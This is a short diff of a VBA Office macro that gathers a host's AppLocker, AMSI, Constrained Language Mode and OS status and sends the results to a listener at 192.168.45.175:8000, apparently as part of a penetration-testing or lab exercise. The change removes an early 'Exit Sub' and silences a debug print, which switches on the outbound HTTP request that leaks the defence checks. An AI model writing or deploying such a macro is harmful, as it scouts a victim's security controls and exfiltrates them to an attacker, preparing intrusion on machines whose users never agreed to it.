@@ -32,10 +32,10 @@ Sub CheckSystemStatus()
 
     ' Combine results
     result = "AppLocker=" & applockerStatus & "&AMSI=" & amsiStatus & "&CLM=" & clmStatus & "&OS=""" & osStatus & """"
-    Debug.Print result
+    ' Debug.Print result
     ' Change URL
     strUrl = "http://192.168.45.175:8000/status.txt?" & result
-    Exit Sub
+
     ' Send GET request
     Set hReq = CreateObject("MSXML2.XMLHTTP")
     
